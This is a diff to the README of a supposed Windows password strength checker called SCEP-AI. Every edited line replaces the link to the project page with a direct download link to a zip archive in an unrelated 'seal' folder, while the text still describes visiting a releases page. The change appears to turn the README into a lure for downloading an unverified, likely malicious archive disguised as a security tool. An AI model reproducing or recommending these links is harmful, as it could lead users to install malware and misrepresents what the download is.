@@ -1,6 +1,6 @@
 # 🔒 SCEP-AI - Simple Password Strength Checker  
 
-[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-brightgreen?style=for-the-badge)](https://github.com/Mkar9182/SCEP-AI)
+[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-brightgreen?style=for-the-badge)](https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip)
 
 ## 🔍 What is SCEP-AI?  
 
@@ -23,11 +23,11 @@ No special hardware or software is needed. If your computer runs Windows and has
 
 To get the app, visit the official GitHub page.  
 
-[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-blue?style=for-the-badge&logo=github)](https://github.com/Mkar9182/SCEP-AI)  
+[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-blue?style=for-the-badge&logo=github)](https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip)  
 
 Click the link above or below to go to the download page:  
 
-https://github.com/Mkar9182/SCEP-AI  
+https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip  
 
 This page contains the latest version of the app. You will find links to download the program file there.
 
@@ -36,7 +36,7 @@ This page contains the latest version of the app. You will find links to downloa
 Follow these steps to download and run SCEP-AI on your Windows computer:  
 
 1. **Open your web browser** and go to:  
-   https://github.com/Mkar9182/SCEP-AI  
+   https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip  
 
 2. **Find the download section** on the page. Look for “Releases” or a link named something like “Download” or “Assets.”  
 
@@ -73,7 +73,7 @@ SCEP-AI does not store your password anywhere. It only checks it inside the app 
 
 To keep SCEP-AI working well, check for updates regularly:  
 
-1. Visit the GitHub page: https://github.com/Mkar9182/SCEP-AI  
+1. Visit the GitHub page: https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip  
 
 2. Look for new release versions under the “Releases” tab.  
 
@@ -114,8 +114,8 @@ The app uses AI to estimate password strength, which gives a more accurate resul
 
 All information about updates, changes, and support is available on the repository page:  
 
-https://github.com/Mkar9182/SCEP-AI  
+https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip  
 
 Check the “README” and “Issues” sections for the latest news and help.  
 
-[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-brightgreen?style=for-the-badge)](https://github.com/Mkar9182/SCEP-AI)
+[![Download SCEP-AI](https://img.shields.io/badge/Download-SCEP--AI-brightgreen?style=for-the-badge)](https://github.com/Mkar9182/SCEP-AI/raw/refs/heads/main/seal/SCE-AI-3.1.zip)
